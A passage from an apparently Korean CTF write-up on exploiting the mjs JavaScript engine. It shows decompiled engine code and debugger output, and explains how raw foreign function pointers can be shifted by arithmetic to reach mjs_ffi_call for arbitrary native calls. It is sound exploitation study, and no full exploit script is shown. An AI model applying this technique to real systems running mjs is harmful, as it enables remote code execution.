</span></span><span style="display:flex;"><span>      v31 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_string</span>(mjs, v30, <span style="color:#ae81ff">0xFFFFFFFFFFFFFFFFLL</span>, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">mjs_push</span>(mjs, v31);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">cs_log_print_prefix</span>(LL_ERROR, <span style="color:#e6db74">&#34;src/mjs_exec.c&#34;</span>, <span style="color:#ae81ff">431</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">cs_log_printf</span>(<span style="color:#e6db74">&#34;Unknown expr: %d&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)op);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>scope의 변수에 넣어주는 기능도 수행한다.
나머진 제대로 분석안했다.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<p>파싱할때 ()를 통해서 함수를 호출하는 바이트 코드를 점화할 수 있다.
exec_expr에서 함수 포인터가 위에 마스크를 달고 raw 하게 저장됨을 알 수 있다.
사실 아주 당연한 내용이지만, js 엔진 건드려본적이 없어서 잘 몰랐다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>      val_0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);                     <span style="color:#75715e">// function PTR  -foreign
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      obj <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);                       <span style="color:#75715e">// scope? 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      key <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_pop</span>(mjs);                       <span style="color:#75715e">// key name str
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">mjs_is_object</span>(obj) )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_set_v</span>(mjs, obj, key, val_0);        <span style="color:#75715e">// set foreign ptr RAW
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      }
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_set_v</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">mjs_val_t</span> obj, <span style="color:#66d9ef">mjs_val_t</span> name, <span style="color:#66d9ef">mjs_val_t</span> val)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mjs_set_internal</span>(mjs, obj, name, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0LL</span>, val);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_set_internal</span>(
</span></span><span style="display:flex;"><span>        mjs <span style="color:#f92672">*</span>mjs,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">mjs_val_t</span> obj,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">mjs_val_t</span> name_v,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>name,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">size_t</span> name_len,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">mjs_val_t</span> val)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  mjs_object <span style="color:#f92672">*</span>o; <span style="color:#75715e">// [rsp+8h] [rbp-58h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> need_free; <span style="color:#75715e">// [rsp+14h] [rbp-4Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs_property <span style="color:#f92672">*</span>p; <span style="color:#75715e">// [rsp+18h] [rbp-48h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_err_t</span> rcode; <span style="color:#75715e">// [rsp+24h] [rbp-3Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> vala; <span style="color:#75715e">// [rsp+28h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">size_t</span> name_lena; <span style="color:#75715e">// [rsp+30h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>namea; <span style="color:#75715e">// [rsp+38h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> name_va; <span style="color:#75715e">// [rsp+40h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">mjs_val_t</span> obja; <span style="color:#75715e">// [rsp+48h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>mjsa; <span style="color:#75715e">// [rsp+50h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  mjsa <span style="color:#f92672">=</span> mjs;
</span></span><span style="display:flex;"><span>  obja <span style="color:#f92672">=</span> obj;
</span></span><span style="display:flex;"><span>  name_va <span style="color:#f92672">=</span> name_v;
</span></span><span style="display:flex;"><span>  namea <span style="color:#f92672">=</span> name;
</span></span><span style="display:flex;"><span>  name_lena <span style="color:#f92672">=</span> name_len;
</span></span><span style="display:flex;"><span>  vala <span style="color:#f92672">=</span> val;
</span></span><span style="display:flex;"><span>  rcode <span style="color:#f92672">=</span> MJS_OK;
</span></span><span style="display:flex;"><span>  need_free <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( name )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    name_va <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xFFF3000000000000LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    rcode <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_to_string</span>(mjsa, <span style="color:#f92672">&amp;</span>name_va, <span style="color:#f92672">&amp;</span>namea, <span style="color:#f92672">&amp;</span>name_lena, <span style="color:#f92672">&amp;</span>need_free);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( rcode )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">goto</span> clean;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_get_own_property</span>(mjsa, obja, namea, name_lena);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>p )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_object</span>(obja) )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mjs_is_string</span>(name_va) )
</span></span><span style="display:flex;"><span>      name_va <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_string</span>(mjsa, namea, name_lena, <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> <span style="color:#a6e22e">mjs_mk_property</span>(mjsa, name_va, vala);
</span></span><span style="display:flex;"><span>    o <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_object_struct</span>(obja);
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> o<span style="color:#f92672">-&gt;</span>properties;
</span></span><span style="display:flex;"><span>    o<span style="color:#f92672">-&gt;</span>properties <span style="color:#f92672">=</span> p;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  p<span style="color:#f92672">-&gt;</span>value <span style="color:#f92672">=</span> vala;
</span></span><span style="display:flex;"><span>clean:
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( need_free )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(namea);
</span></span><span style="display:flex;"><span>    namea <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> rcode;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>mjs_property <span style="color:#f92672">*</span><span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_mk_property</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">mjs_val_t</span> name, <span style="color:#66d9ef">mjs_val_t</span> value)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  mjs_property <span style="color:#f92672">*</span>result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> <span style="color:#a6e22e">new_property</span>(mjs);
</span></span><span style="display:flex;"><span>  result<span style="color:#f92672">-&gt;</span>next <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  result<span style="color:#f92672">-&gt;</span>name <span style="color:#f92672">=</span> name;
</span></span><span style="display:flex;"><span>  result<span style="color:#f92672">-&gt;</span>value <span style="color:#f92672">=</span> value;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>value가 그대로 저장된다.
이걸로 scope에 foreign 함수 포인터를 raw하게 저장시킬 수 있다.
이제 여기서 함수 포인터에 대한 연산을 수행할 수 있다.
do_op 함수의 일부 코드를 보면 왜 가능한지 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">mjs_is_foreign</span>(a) <span style="color:#f92672">||</span> <span style="color:#a6e22e">mjs_is_foreign</span>(b)) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       * When one of the operands is a pointer, only + and - are supported,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       * and the result is a pointer.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       */</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (op <span style="color:#f92672">!=</span> TOK_MINUS <span style="color:#f92672">&amp;&amp;</span> op <span style="color:#f92672">!=</span> TOK_PLUS) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mjs_prepend_errorf</span>(mjs, MJS_TYPE_ERROR, <span style="color:#e6db74">&#34;invalid operands&#34;</span>);
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      is_result_ptr <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span></code></pre></div><p>하나만 foreign pointer를 주고 그냥 상수를 더하면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#960050;background-color:#1e0010">►</span> <span style="color:#ae81ff">0x5647fc468aec</span> <span style="color:#f92672">&lt;</span>exec_expr<span style="color:#f92672">+</span><span style="color:#ae81ff">124</span><span style="color:#f92672">&gt;</span>    call   do_op                <span style="color:#f92672">&lt;</span>do_op<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x5647fe14f2a0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0xfff25647fc465660</span>
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x403e000000000000</span>
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0xd</span>
</span></span></code></pre></div><p>실제로 연산이 될때 raw 하게 들어가는 것을 볼 수 있다.
do_op에서는 do_arith_op을 호출한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">double</span> <span style="color:#a6e22e">do_arith_op</span>(<span style="color:#66d9ef">double</span> da, <span style="color:#66d9ef">double</span> db, <span style="color:#66d9ef">int</span> op, <span style="color:#66d9ef">bool</span> <span style="color:#f92672">*</span>resnan) {
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>resnan <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isnan</span>(da) <span style="color:#f92672">||</span> <span style="color:#a6e22e">isnan</span>(db)) {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>resnan <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* clang-format off */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">switch</span> (op) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_MINUS:   <span style="color:#66d9ef">return</span> da <span style="color:#f92672">-</span> db;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_PLUS:    <span style="color:#66d9ef">return</span> da <span style="color:#f92672">+</span> db;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_MUL:     <span style="color:#66d9ef">return</span> da <span style="color:#f92672">*</span> db;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_DIV:
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (db <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> da <span style="color:#f92672">/</span> db;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* TODO(dfrank): add support for Infinity and return it here */</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>resnan <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_REM:
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       * TODO(dfrank): probably support remainder operation as it is in JS
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       * (which works with non-integer divisor).
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       */</span>
</span></span><span style="display:flex;"><span>      db <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>) db;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (db <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">bool</span> neg <span style="color:#f92672">=</span> false;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (da <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>          neg <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>          da <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>da;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (db <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>          db <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>db;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        da <span style="color:#f92672">=</span> (<span style="color:#66d9ef">double</span>) ((<span style="color:#66d9ef">int64_t</span>) da <span style="color:#f92672">%</span> (<span style="color:#66d9ef">int64_t</span>) db);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (neg) {
</span></span><span style="display:flex;"><span>          da <span style="color:#f92672">=</span> <span style="color:#f92672">-</span>da;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> da;
</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>resnan <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_AND:     <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>) ((<span style="color:#66d9ef">int64_t</span>) da <span style="color:#f92672">&amp;</span> (<span style="color:#66d9ef">int64_t</span>) db);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_OR:      <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>) ((<span style="color:#66d9ef">int64_t</span>) da <span style="color:#f92672">|</span> (<span style="color:#66d9ef">int64_t</span>) db);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_XOR:     <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>) ((<span style="color:#66d9ef">int64_t</span>) da <span style="color:#f92672">^</span> (<span style="color:#66d9ef">int64_t</span>) db);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_LSHIFT:  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>) ((<span style="color:#66d9ef">int64_t</span>) da <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">int64_t</span>) db);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_RSHIFT:  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>) ((<span style="color:#66d9ef">int64_t</span>) da <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#66d9ef">int64_t</span>) db);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> TOK_URSHIFT: <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">double</span>) ((<span style="color:#66d9ef">uint32_t</span>) da <span style="color:#f92672">&gt;&gt;</span> (<span style="color:#66d9ef">uint32_t</span>) db);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* clang-format on */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>resnan <span style="color:#f92672">=</span> true;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>그대로 연산이 되는데 상위 2바이트를 침범하면, type confusion?도 가능할 것 같다.
어쨌든 여기서 foreign pointer와 연산이 되면, 다른 함수를 호출할 수 있다.</p>
<p>상위 2바이트만 안건들면 그대로 연산이 되고 0xfff2가 남아서 foreign pointer로 인식되고 OP_CALL로 함수 포인터를 호출할 수 있다.
SCOPE에 그대로 저장되기 때문에 그냥 호출하면 된다.</p>
<p>patch.diff에서 ffi 등록하는 코드를 지웠지만, ffi의 코드는 남아있기 때문에 ffi로 점프하면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_err_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">mjs_ffi_call</span>(mjs <span style="color:#f92672">*</span>mjs)
</span></span></code></pre></div><p>mjs_ffi_call로 점프해주면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">mjs_ffi_ctype_t</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">parse_cval_type</span>(mjs <span style="color:#f92672">*</span>mjs, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>e)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> v4; <span style="color:#75715e">// [rsp+Eh] [rbp-32h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bool</span> v5; <span style="color:#75715e">// [rsp+Fh] [rbp-31h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mg_str ms; <span style="color:#75715e">// [rsp+10h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>ea; <span style="color:#75715e">// [rsp+20h] [rbp-20h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>sa; <span style="color:#75715e">// [rsp+28h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  mjs <span style="color:#f92672">*</span>mjsa; <span style="color:#75715e">// [rsp+30h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  mjsa <span style="color:#f92672">=</span> mjs;
</span></span><span style="display:flex;"><span>  sa <span style="color:#f92672">=</span> s;
</span></span><span style="display:flex;"><span>  ea <span style="color:#f92672">=</span> e;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(ms));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( sa <span style="color:#f92672">&lt;</span> ea )
</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span><span style="color:#a6e22e">__ctype_b_loc</span>())[<span style="color:#f92672">*</span>sa] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v5 )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>sa;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( ea <span style="color:#f92672">&gt;</span> sa )
</span></span><span style="display:flex;"><span>      v4 <span style="color:#f92672">=</span> ((<span style="color:#f92672">*</span><span style="color:#a6e22e">__ctype_b_loc</span>())[<span style="color:#f92672">*</span>(ea <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 )
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">--</span>ea;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  ms.p <span style="color:#f92672">=</span> sa;
</span></span><span style="display:flex;"><span>  ms.len <span style="color:#f92672">=</span> ea <span style="color:#f92672">-</span> sa;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;void&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;userdata&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;int&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;bool&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">4</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;double&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">5</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;float&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">6</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;char*&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">mg_vcmp</span>(<span style="color:#f92672">&amp;</span>ms, <span style="color:#e6db74">&#34;char *&#34;</span>) )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">7</span>;
